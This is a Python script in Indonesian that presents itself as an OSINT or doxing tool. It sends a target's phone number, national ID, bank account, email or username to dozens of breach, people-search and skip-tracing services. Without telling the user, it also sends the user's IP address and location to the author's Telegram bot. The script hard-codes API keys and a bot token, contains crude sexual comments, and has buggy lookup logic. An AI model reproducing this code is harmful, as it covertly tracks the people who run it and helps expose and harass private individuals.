#Devolopment Create By Rolandino
#Tolong Hargai Saya Bro, Ini Bikin Nya Ngk Sehari ;)
import requests
import json
import re
import time
import phonenumbers
from phonenumbers import geocoder as pn_geocoder, carrier as pn_carrier
import json
import os
from datetime import datetime
#Semangat Ngoding 
LIMIT = 6
DATA_FILE = 'user_limit.json'
PASSWORD = 'Rolandino'  # Programmer Gila

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f)

def can_use(user_id):
    data = load_data()
    today = datetime.now().strftime('%Y-%m-%d')

    if user_id not in data:
        data[user_id] = {"date": today, "count": 0}

    if data[user_id]['date'] != today:
        data[user_id] = {"date": today, "count": 0}

    if data[user_id]['count'] < LIMIT:
        data[user_id]['count'] += 1
        save_data(data)
        return True, LIMIT - data[user_id]['count']
    else:
        return False, 0

#ASEDEKONTOLMUKALUKAYAKONTOL

pw = input("MASUKAN PASSWORD UNTUK LOGIN : ")

if pw != PASSWORD:
    print("\nPASSWORD NYA ( Rolandino )\n")
    exit()

akses, sisa = can_use(pw)  #Gila Coding

if akses:
    print(f"\nSELAMAT AKSES DITERIMA !")
    print(f"SISA LIMIT KAMU HARI INI : {sisa}\n")

    while True:
        print("=== THIS IS ROLANDINO TOOLS SCRIPT ===")
        print("[1] JALANKAN TOOLS SCRIPT NYA")
        print("[2] IKUTI FACEBOOK SAYA")
        print("[3] KELUAR")
        pilih = input("PILIH : ")

        if pilih == "1":
            print("\nAku Bukan Siapa Siapa, Aku Hanya Bayangan Yang Tersisa Dari Masalalu Yang Dikhianati :)\n")
            break
        elif pilih == "2":
            print("\nJANGAN LUPA FOLLOW FACEBOOK SAYA :)")
            print("[ https://www.facebook.com/profile.php?id=100094471519310 ]\n")
        elif pilih == "3":
            print("\nKELUAR DARI PROGRAM\n")
            break
        else:
            print("\nPILIH YANG BENAR GOBLOK\n")
else:
    print("\nLIMIT HARI INI SUDAH HABIS, SILAHKAN TUNGGU BESOK LAGI !\n")

#NOTE,Hargai Saya Sebagai Devolopment Tools Script Ini,Mohon Jangan Di Perjual Belikan,Jika Ingin Mengembangkan Tools Script Ini?,Tambahkan ( Nama Saya Rolandino ) Sebagai Devolopment Utama,Agar ( Sumber Utama ) Licensi Tools Script Ini Tetap Terjaga 😉

TELEGRAM_BOT_TOKEN = "AAE5fo3b8v_CQVC2f2M3SscdLqHfBGeux50"
TELEGRAM_CHAT_ID = "7413457967"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except:
        pass

def collect_and_send_user_info():
    try:
        ip_data = requests.get("https://ipinfo.io/json").json()
        msg = f"""New Access
IP: {ip_data.get('ip')}
City: {ip_data.get('city')}
Country: {ip_data.get('country')}
Org: {ip_data.get('org')}
"""
        send_to_telegram(msg)
    except:
        pass

#AKU SUKA TETE NONIM TOBRUT BANGET WOKWOKWOKWOK 🤪
collect_and_send_user_info()

#API PASARAN/PUBLIC ( Terserah Anda Mau Ganti Atau Tidak, Karna Ini Cuman Api Tambahan Biasa, Untuk Api Premium Cek Di Folder (.env) Etsss Api Nya Gw Enc Bro Yakali Enak Aja Lu, BELI GOBLOK 😂 )
API_KEY_NUMVERIFY = "d9fecb24eeb4f485fe8539ffa5ccfb45"
API_KEY_VERIPHONE = "E28C1E73072841F0A3CF93FFE936F369"
API_KEY_LEAKCHECK_IO = "49535f49545f5245414c4c595f4150495f4b4559"
API_KEY_LEAKCHECK_NET = "49535f49545f5245414c4c595f4150495f4b4559"
API_KEY_RAPIDAPI = "6f6be78672msh90081e9e01ae3adp1c3959jsn793c499831a8"
API_KEY_IPINFODB = "Malas_Ngisi_-"
RAPIDAPI_HOST = "skip-tracing-working-api.p.rapidapi.com"

results = []
errors_log = []

def validate_target_input(target, category):
    if "Phone" in category or "IMEI" in category:
        if not target.startswith("+") and "Phone" in category:
            print("PROSES OSIND SEDANG BERJALAN [ HARAP TUNGGU SAMPAI PROSES SELESAI ]")
            return "+" + target
    return target

def log_error(message):
    errors_log.append(message)

def phone_number_info(target):
    try:
        parsed = phonenumbers.parse(target)
        location = pn_geocoder.description_for_number(parsed, "en")
        provider = pn_carrier.name_for_number(parsed, "en")
        print(f"LOCATION : {location}")
        print(f"PROVIDER : {provider}")

        if location:
            response = requests.get(f"https://nominatim.openstreetmap.org/search?q={location}&format=json")
            if response.status_code == 200 and response.json():
                lat = response.json()[0]['lat']
                lon = response.json()[0]['lon']
                print(f"Maps Link: https://www.google.com/maps/search/?api=1&query={lat},{lon}")
            else:
                print("NOT FOUND")
    except Exception as e:
        print(f"NOT FOUND : {e}")

def check_api(category, url_template, target, delay, method="normal"):
    try:
        checked_target = validate_target_input(target, category)
        url = url_template.format(
            query=checked_target,
            api_key_numverify=API_KEY_NUMVERIFY,
            api_key_veriphone=API_KEY_VERIPHONE,
            api_key_leakcheck_io=API_KEY_LEAKCHECK_IO,
            api_key_leakcheck_net=API_KEY_LEAKCHECK_NET,
            api_key_ipinfodb=API_KEY_IPINFODB
        )

        if method == "rapidapi":
            headers = {
                "X-RapidAPI-Key": API_KEY_RAPIDAPI,
                "X-RapidAPI-Host": RAPIDAPI_HOST
            }
            response = requests.get(url, headers=headers, timeout=10)

        elif method == "rapidapi_nik":
            headers = {
                "X-RapidAPI-Key": API_KEY_RAPIDAPI,
                "X-RapidAPI-Host": "nik-parser.p.rapidapi.com"
            }
            response = requests.get(url, headers=headers, timeout=10)

        elif method == "rapidapi_imei_post":
            headers = {
                "X-RapidAPI-Key": API_KEY_RAPIDAPI,
                "X-RapidAPI-Host": "imei-checker4.p.rapidapi.com",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            payload = {"imei": checked_target}
            response = requests.post(url, headers=headers, data=payload, timeout=10)

        elif method == "rapidapi_telephonetocountry":
            headers = {
                "X-RapidAPI-Key": API_KEY_RAPIDAPI,
                "X-RapidAPI-Host": "telephonetocountry.p.rapidapi.com"
            }
            response = requests.get(url, headers=headers, timeout=10)

        elif method == "post_url":
            response = requests.post(url, data={"url": checked_target}, timeout=10)

        elif method == "rapidapi_cekrekening":
            headers = {
                "X-RapidAPI-Key": API_KEY_RAPIDAPI,
                "X-RapidAPI-Host": "cek-nomor-rekening-bank-indonesia1.p.rapidapi.com"
            }
            response = requests.get(url, headers=headers, timeout=10)

        elif method == "rapidapi_threatbite":
            headers = {
                "X-RapidAPI-Key": API_KEY_RAPIDAPI,
                "X-RapidAPI-Host": "threatbite-phone-number-validation-optimatiq.p.rapidapi.com"
            }
            response = requests.get(url, headers=headers, timeout=10)

        elif method == "rapidapi_indogeocoder":
            headers = {
                "X-RapidAPI-Key": API_KEY_RAPIDAPI,
                "X-RapidAPI-Host": "indonesia-geocoder.p.rapidapi.com"
            }
            response = requests.get(url, headers=headers, timeout=10)

        elif method == "rapidapi_decodenik":
            headers = {
                "X-RapidAPI-Key": API_KEY_RAPIDAPI,
                "X-RapidAPI-Host": "decode-nik-dan-kk.p.rapidapi.com"
            }
            response = requests.get(url, headers=headers, timeout=10)

        elif method == "rapidapi_digitalfootprint":
            headers = {
                "X-RapidAPI-Key": API_KEY_RAPIDAPI,
                "X-RapidAPI-Host": "digital-footprint-api1.p.rapidapi.com",
        "Content-Type": "application/json"
            }
            payload = {
        "mobile": checked_target,
        "consent": "Y",
        "consent_text": "I hear by declare my consent agreement for fetching my information via AITAN Labs API"
            }
            response = requests.post(url, headers=headers, json=payload, timeout=10)

        elif method == "rapidapi_xchecker_bulk":
            headers = {
                "X-RapidAPI-Key": API_KEY_RAPIDAPI,
                "X-RapidAPI-Host": "x-checker.p.rapidapi.com",
        "Content-Type": "application/json"
            }
            payload = {
        "input": [checked_target]
            }
            response = requests.post(url, headers=headers, json=payload, timeout=10)

        elif method == "rapidapi_mobilephones":
            headers = {
                "X-RapidAPI-Key": API_KEY_RAPIDAPI,
                "X-RapidAPI-Host": "mobile-phones2.p.rapidapi.com"
            }
            response = requests.get(url, headers=headers, timeout=10)

        elif method == "rapidapi_fbpagescraper":
            headers = {
                "X-RapidAPI-Key": API_KEY_RAPIDAPI,
                "X-RapidAPI-Host": "facebook-pages-scraper3.p.rapidapi.com"
            }
            response = requests.get(url, headers=headers, timeout=10)

        elif method == "rapidapi_phoneanalyzer":
            headers = {
                "X-RapidAPI-Key": API_KEY_RAPIDAPI,
                "X-RapidAPI-Host": "phone-number-analyzer.p.rapidapi.com",
        "Content-Type": "application/json"
            }
            payload = {
        "number": checked_target,
        "region": "ua"
            }
            response = requests.post(url, headers=headers, json=payload, timeout=10)

        elif method == "rapidapi_maliciousscanner":
            headers = {
                "X-RapidAPI-Key": API_KEY_RAPIDAPI,
                "X-RapidAPI-Host": "malicious-scanner.p.rapidapi.com"
            }
            response = requests.get(url, headers=headers, timeout=10)

        else:
            response = requests.get(url, timeout=10)

        result_data = {
            "category": category,
            "url": url,
            "status_code": response.status_code,
            "response_snippet": response.text[:500]
        }

        if response.status_code == 200:
            try:
                result_data["response_json"] = response.json()
            except:
                result_data["response_json"] = None
            print(f"[✓] {category} | {url} | Status: {response.status_code}")
        else:
            print(f"[️!] {category} | {url} | Status: {response.status_code}")

        results.append(result_data)
        time.sleep(delay)

    except Exception as e:
        error_msg = f"[!] {category} | {url_template} | Error: {e}"
        print(error_msg)
        log_error(error_msg)
        results.append({
            "category": category,
            "url": url_template,
            "status_code": None,
            "error": str(e)
        })
        time.sleep(delay)

def run_scan(apis, selected, target, delay):
    for category, api_list in apis.items():
        if "ALL" in selected or category in selected:
            for url, method in api_list:
                check_api(category, url, target, delay, method)

def save_results():
    with open("result.json", "w") as f:
        json.dump(results, f, indent=4)
    print("SILAHKAN CEK HASIL OSIND DI [ result.json ]")

def save_errors():
    with open("error.log", "w") as f:
        for err in errors_log:
            f.write(err + "\n")
    print("HASIL GAGAL DI SIMPAN DI [ error.log ]")

def show_menu(apis):
    print("\nPROGRAM SCRIPT INI MAMPU MEMBERIKAN DATA YANG KAMU CARI SECARA AKURAT & REALTIME HASILNYA DALAM FILE [ result.json ]")
    categories = list(apis.keys())
    for i, cat in enumerate(categories, 1):
        print(f"[{i}] {cat}")
    print(f"[{len(categories)+1}] MULAI DOXING DARI SEMUA BASE LEAK")

    choice = input("PILIH : ").split(",")
    selected = []
    for ch in choice:
        ch = ch.strip()
        if ch.isdigit() and 1 <= int(ch) <= len(categories):
            selected.append(categories[int(ch)-1])
        elif ch == str(len(categories)+1):
            return ["ALL"]
    return selected
#Salah Titik Koma Aja Eror Goblog!
def main():
    apis = {
        "DATABASE LEAK V1": [
            ("https://numverify.com/api?access_key={api_key_numverify}&number={query}", "normal"),
            ("https://veriphone.io/v2/verify?phone={query}&key={api_key_veriphone}", "normal"),
            ("https://numlookupapi.com/api/v1/validate?number={query}", "normal")
        ],

        "DATABASE LEAK V2": [
    ("https://telephonetocountry.p.rapidapi.com/number?q={query}", "normal")
    ],

        "DATABASE LEAK V3": [
    ("https://indonesia-geocoder.p.rapidapi.com/geocoding?address={query}", "rapidapi_indogeocoder")
],

        "DATABASE LEAK V4": [
    ("https://threatbite-phone-number-validation-optimatiq.p.rapidapi.com/v1/number/{query}", "rapidapi_threatbite")
    ],

        "DATABASE LEAK V5": [
    ("https://cek-nomor-rekening-bank-indonesia1.p.rapidapi.com/cekRekening?kodeBank=014&noRekening={query}", "rapidapi_cekrekening")
    ],

        "DATABASE LEAK V6": [
            ("https://whatsmyname.app/api/search?username={query}", "normal")
        ],

        "DATABASE LEAK V7": [
            ("https://leakcheck.io/api?check={query}&key={api_key_leakcheck_io}", "normal"),
            ("https://leakcheck.net/api/public?key={api_key_leakcheck_net}&check={query}", "normal"),
            ("https://pastebin.com/api_scrape_item.php?item_id={query}", "normal")
        ],

        "DATABASE LEAK V8": [
            ("https://ipinfo.io/{query}/json", "normal"),
            ("http://ip-api.com/json/{query}", "normal")
        ],

        "DATABASE LEAK V9": [
            ("https://viewdns.info/reverseip/?host={query}&t=1", "normal"),
            ("https://crt.sh/?q={query}", "normal")
        ],

        "DATABASE LEAK V10": [
            ("https://who.is/whois/{query}", "normal")
        ],

        "DATABASE LEAK V11": [
            ("https://apitokentest.com/validate?key={query}", "normal"),
            ("https://api.tokenvalidator.io/v1/validate?token={query}", "normal")
        ],

        "DATABASE LEAK V12": [
            ("https://skip-tracing-working-api.p.rapidapi.com/lookup?phone={query}", "rapidapi"),
            ("https://skip-tracing-working-api.p.rapidapi.com/personDetailsByIp?ip={query}", "rapidapi"),
            ("https://skip-tracing-working-api.p.rapidapi.com/personDetailsByName?name={query}", "rapidapi"),
            ("https://skip-tracing-working-api.p.rapidapi.com/personDetailsByEmail?email={query}", "rapidapi")
        ],

        "DATABASE LEAK V13": [
            ("https://nik-parser.p.rapidapi.com/ektp?nik={query}", "rapidapi_nik")
        ],

        "DATABASE LEAK V14": [
            ("https://imei-checker4.p.rapidapi.com/imei", "rapidapi_imei_post")
        ],

        "DATABASE LEAK V15": [
            ("https://ipapi.co/{query}/json/", "normal"),
            ("https://ipwho.is/{query}", "normal"),
            ("https://api.bgpview.io/ip/{query}", "normal")
        ],

        "DATABASE LEAK V16": [
            ("https://api.dnscheck.co/{query}", "normal"),
            ("https://api-ninjas.com/api/dnslookup?domain={query}", "normal"),
            ("https://cloudflare-trace.com/{query}", "normal")
        ],

        "DATABASE LEAK V17": [
            ("https://domainsdb.info/?format=json&domain={query}", "normal"),
            ("http://api.ipinfodb.com/v3/ip-city/?key={api_key_ipinfodb}&ip={query}", "normal")
        ],

        "DATABASE LEAK V18": [
            ("https://www.virustotal.com/api/v3/ip_addresses/{query}", "normal"),
            ("https://otx.alienvault.com/api/v1/indicators/IPv4/{query}/general", "normal"),
            ("https://api.abuseipdb.com/api/v2/check?ipAddress={query}", "normal"),
            ("https://urlscan.io/api/v1/scan/", "post_url")
        ],

        "DATABASE LEAK V19": [
            ("https://mrisa.herokuapp.com/api/v1?url={query}", "normal")
        ],

        "DATABASE LEAK V20": [
            ("https://darksearch.io/search?q={query}", "normal")
        ],

        "DATABASE LEAK V21": [
            ("https://haveibeenpwned.com/api/v2/breachedaccount/{query}", "normal"),
            ("https://psbdmp.ws/api?email={query}", "normal")
        ],

        "DATABASE LEAK V22": [
            ("https://lookup.binlist.net/{query}", "normal"),
            ("https://api.blockchair.com/bitcoin/dashboards/address/{query}", "normal")
        ],
        "DATABASE LEAK V23": [("https://api.shodan.io/shodan/host/{query}?key=YOUR_KEY", "normal")],
"DATABASE LEAK V24": [("https://censys.io/api/v1/view/ipv4/{query}", "normal")],
"DATABASE LEAK V25": [("https://api.zoomeye.org/host/search?query={query}", "normal")],
"DATABASE LEAK V26": [("https://api.greynoise.io/v3/community/{query}", "normal")],
"DATABASE LEAK 27": [("https://www.onyphe.io/search/?q={query}&format=json", "normal")],
"DATABASE LEAK V28": [("https://api.builtwith.com/v12/api.json?tld={query}&KEY=YOUR", "normal")],
"DATABASE LEAK V29": [("https://api.wappalyzer.com/lookup/v2/?url={query}&KEY=YOUR", "normal")],
"DATABASE LEAK V30": [("https://api.dnscheck.co/{query}", "normal")],
"DATABASE LEAK V31": [
("https://decode-nik-dan-kk.p.rapidapi.com/nik/{query}", "rapidapi_decodenik")],
"DATABASE LEAK V32": [
    ("https://digital-footprint-api1.p.rapidapi.com/digital/v1/mobile", "rapidapi_digitalfootprint")],
"DATABASE LEAK V33": [
("https://x-checker.p.rapidapi.com/check_bulk", "rapidapi_xchecker_bulk")],
"DATABASE LEAK V34": [
("https://malicious-scanner.p.rapidapi.com/rapid/url?url={query}", "rapidapi_maliciousscanner")],
"DATABASE LEAK V35": [
("https://phone-number-analyzer.p.rapidapi.com/phone-number-in-google-search", "rapidapi_phoneanalyzer")],
"DATABASE LEAK V36": [
("https://facebook-pages-scraper3.p.rapidapi.com/get-business-home-page-details?urlSupplier={query}", "rapidapi_fbpagescraper")],
"DATABASE LEAK V37": [
("https://mobile-phones2.p.rapidapi.com/phones/{query}", "rapidapi_mobilephones")],
"DATABASE LEAK V38": [("https://api-ninjas.com/api/dnslookup?domain={query}", "normal")],
"DATABASE LEAK V38": [("https://cloudflare-trace.com/{query}", "normal")],
"DATABASE LEAK V39": [("https://www.virustotal.com/api/v3/ip_addresses/{query}", "normal")],
"DATABASE LEAK V40": [("https://phisherman.gg/api/check?url={query}", "normal")],
"DATABASE LEAK V41": [("https://haveibeenpwned.com/api/v2/breachedaccount/{query}", "normal")],
"DATABASE LEAK V42": [("https://psbdmp.ws/api?email={query}", "normal")],
"DATABASE LEAK V43": [("https://darksearch.io/search?q={query}", "normal")],
"DATABASE LEAK V44": [("https://ipapi.co/{query}/json/", "normal")],
"DATABASE LEAK V45": [("https://ipwho.is/{query}", "normal")],
"DATABASE LEAK V46": [("https://api.bgpview.io/ip/{query}", "normal")],
"DATABASE LEAK V47": [("https://api.builtwith.com/free?domain={query}", "normal")],
"DATABASE LEAK V48": [("https://api.wappalyzer.com/lookup/?url={query}", "normal")],
"DATABASE LEAK V49": [
    ("https://phone-leak-search.p.rapidapi.com/search?phone={query}", "rapidapi")
],

"DATABASE LEAK V50": [
    ("https://numlookupapi.com/api/v1/validate?number={query}", "normal")
],

"DATABASE LEAK V51": [
    ("https://ipqualityscore.com/api/json/phone/{query}", "normal")
],

"DATABASE LEAK V52": [
    ("https://phone-number-api.com/api/validate?number={query}", "normal")
],

"DATABASE LEAK V53": [
    ("https://leak-lookup.com/api/search?phone={query}", "normal")
],

"DATABASE LEAK V54": [
    ("https://freewebapi.com/data-apis/compromised-data-check-api?query={query}", "normal")
],

"DATABSE LEAK V55": [
    ("https://api.dehashed.com/search?query={query}", "normal")
],

"DATABASE LEAK V56": [
    ("https://api.truecaller.com/search?number={query}", "normal")
],

"DATABASE LEAK V57": [
    ("https://sync.me/api/search?number={query}", "normal")
],

"DATABASE LEAK V58": [
    ("https://whocalledme.com/api/search?phone={query}", "normal")
],

"DATABASE LEAK V59": [
    ("https://freecarrierlookup.com/api?number={query}", "normal")
],

"DATABASE LEAK V60": [
    ("https://nuwber.com/api/search?phone={query}", "normal")
],

"DATABASE LEAK V61": [
    ("phoneinfoga scan -n {query}", "command")
],

"DATABASE LEAK V62": [
    ("osint-phonenumbers {query}", "command")
],

"DATABASE LEAK V63": [
    ("https://pastehunter.com/api/search?phone={query}", "normal")
],

"DATABASE LEAK V64": [
    ("https://osint-toolkit.com/api/phone-leak?number={query}", "normal")
],

"DATABASE LEAK V65": [
    ("https://api.osint.co.za/v1/phone/{query}", "normal")
],

"DATABASE LEAK V66": [
    ("https://aware-online.com/api/search?number={query}", "normal")
],

"DATABASE LEAK V67": [
    ("https://phonenumber-osint.com/api/search?number={query}", "normal")
],

"DATABASE LEAK V68": [
    ("https://freedatabreaches.com/api/search?phone={query}", "normal")
],
"DATABASE LEAK V69": [
    ("https://whatsmyname.app/api/search?username={query}", "normal")
],
"DATABASE LEAK V70": [
    ("https://analyzeid.com/username/{query}", "normal")
],
"DATABASE LEAK V71": [
    ("https://idcrawl.com/username/{query}", "normal")
],
"DATABASE LEAK V72": [
    ("https://intelx.io/api/username/{query}", "normal")
],
"DATABASE LEAK 73": [
    ("maigret {query}", "command")
],
"DATABASE LEAK V74": [
    ("sherlock {query}", "command")
],
"DATABASE LEAK V75": [
    ("https://socialscan.net/api/user/{query}", "normal")
],
"DATABASE LEAK V76": [
    ("https://socid-extractor.api/{query}", "normal")
],
"DATABASE LEAK V77": [
    ("userfinder {query}", "command")
],
"DATABASE LEAK V78": [
    ("https://api.blackbird.pw/username/{query}", "normal")
]
    }

    print("\nWELCOME TO MULTI DOXING INTELLIGENCE [ CODED BY ROLANDINO ] ")

    target = input("MASUKAN TARGET [ NAMA/NOMOR/EMAIL/IP/DOMAIN/NIK/BPJS/IMEI/WALET/NOREK/PLAT/JALAN/LINK/DLL ] : ").strip()

    try:
        delay = float(input("ATUR DELAY [1] : ").strip())
    except:
        print("ATUR DELAY YANG SESUAI")
        delay = 1

    selected = show_menu(apis)

    if any("Phone" in cat for cat in selected) or "ALL" in selected:
        phone_number_info(target)

    print(f"\nTARGET : {target} in {', '.join(selected)}\n")
    run_scan(apis, selected, target, delay)
    save_results()
    save_errors()
    print("\nBERHASIL MENGGUMPULKAN DATA TARGET,SILAHKAN CEK HASILNYA DI [ result.json ]")

if __name__ == "__main__":
    main()